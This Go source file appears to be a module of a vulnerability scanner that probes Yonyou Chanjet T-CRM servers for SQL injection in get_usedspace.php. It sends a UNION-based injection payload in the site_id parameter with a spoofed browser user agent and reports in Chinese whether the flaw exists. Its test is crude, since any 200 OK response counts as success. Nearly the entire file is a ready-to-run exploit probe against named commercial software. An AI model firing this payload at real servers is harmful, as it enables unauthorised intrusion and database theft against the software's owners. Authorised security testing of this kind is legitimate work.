package T_CRM_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/WebSer~1/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20CONCAT(0x7178767671,0x5664726e476a637a565a50614d4c435745446a50614756506d486d58544b4e646d7a577170685165,0x7171626b71)"
	resp, err := client.R().SetHeaders(map[string]string{ // Set multiple headers at once
		"User-Agent": UA,
	}).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 畅捷通T-CRM get_usedspace.php SQL注入漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 用友 畅捷通T-CRM get_usedspace.php SQL注入漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 畅捷通T-CRM get_usedspace.php SQL注入漏洞不存在")
}
